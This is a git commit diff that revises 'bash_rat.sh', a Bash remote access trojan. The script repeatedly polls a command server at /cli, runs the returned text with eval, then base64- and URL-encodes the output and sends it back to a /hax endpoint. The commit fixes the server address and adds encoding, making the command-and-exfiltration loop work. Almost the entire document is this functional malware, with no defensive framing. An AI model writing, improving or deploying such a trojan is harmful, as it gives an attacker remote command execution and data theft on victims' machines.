594273449d29b41d78677d4ee0ee76986fd3f843
edsabi <38739707+edsabi@users.noreply.github.com>
2024-11-13 15:56:21 -0500

    Update bash_rat.sh

--- bash_rat.sh
+++ bash_rat.sh
@@ -1,23 +1,21 @@
 #!/usr/bin/env bash
 
 while true; do
-        url="127:0.0.1:8080"
-        a=$(curl  -X GET "$url/cli")
-        if [ "$a" != "" ]; then
-                b=$(eval $a 2>&1)
-                for ((i=0;i<${#b};i++)) do
-                        printf "%s." ${b:i:1}
-                done
-                c=$(echo -n "$b" | base64)
-                e="http://$url/hax/"
-                d="$e$c"
-                echo $d
-                curl  -X GET $d
-                sleep 2
-        else
-                sleep 2
-                echo "it works"
-        fi
-
-
+    url="127.0.0.1:8080"  # Corrected the URL
+    a=$(curl -s -X GET "$url/cli")
+    if [ "$a" != "" ]; then
+        b=$(eval "$a" 2>&1)
+        c=$(echo -n "$b" | base64)
+        # URL-encode the base64-encoded data
+        c_urlencoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$c'''))")
+        e="http://$url/hax"
+        d="$e?data=$c_urlencoded"
+        echo "$d"
+        curl -s -X GET "$d"
+        sleep 2
+    else
+        sleep 2
+        echo "it works"
+    fi
 done
+
